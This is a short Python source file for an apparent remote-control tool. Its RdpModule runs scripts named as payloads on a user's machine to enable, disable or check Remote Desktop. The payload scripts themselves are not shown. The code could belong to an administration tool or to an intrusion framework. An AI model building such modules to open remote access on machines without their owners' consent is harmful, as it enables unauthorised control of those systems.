from dataManager.repository.userRepository import UserRepository
import logging

class RdpModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "rdp"
        self.user_repository = user_repository


    async def runCodeAndReturnOutput(self, id, payload_path):
        user = self.user_repository.get_user(id)
        if not user:
            logging.error(f"User with id {id} not found")
            raise Exception("User not found.")
        
        output = await user.execute(payload_path)
        return output

    async def activate(self, id: str):
        return {"message": await self.runCodeAndReturnOutput(id, "./modules/payloads/payload_enable_rdp.py")}

    async def deactivate(self, id: str):
        return {"message": await self.runCodeAndReturnOutput(id, "./modules/payloads/payload_disable_rdp.py")}

    async def status(self, id: str):
        return {"message": await self.runCodeAndReturnOutput(id, "./modules/payloads/payload_status_rdp.py")}
